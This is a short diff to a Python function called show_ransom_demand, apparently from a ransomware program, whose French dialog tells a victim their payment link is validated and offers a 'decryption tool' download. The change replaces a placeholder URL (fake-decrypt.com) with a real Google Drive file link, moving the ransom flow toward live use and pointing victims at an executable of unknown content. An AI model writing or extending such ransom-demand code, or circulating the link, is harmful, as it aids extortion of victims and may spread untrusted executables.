@@ -51,7 +51,7 @@ def show_ransom_demand():
                 "Merci",
                 f"Votre lien de transaction a été validé :\n{transaction_link}\n\n"
                 f"Vous pouvez télécharger votre outil de décryptage ici :\n"
-                f"https://fake-decrypt.com/decrypt_tool.exe"
+                f"https://drive.google.com/file/d/17HiOVdsy9nu9-W-rIlxyD8IbdRZyctFb/view?usp=drive_link"
             )
             root.quit()  # Ferme l'application après confirmation
         else:
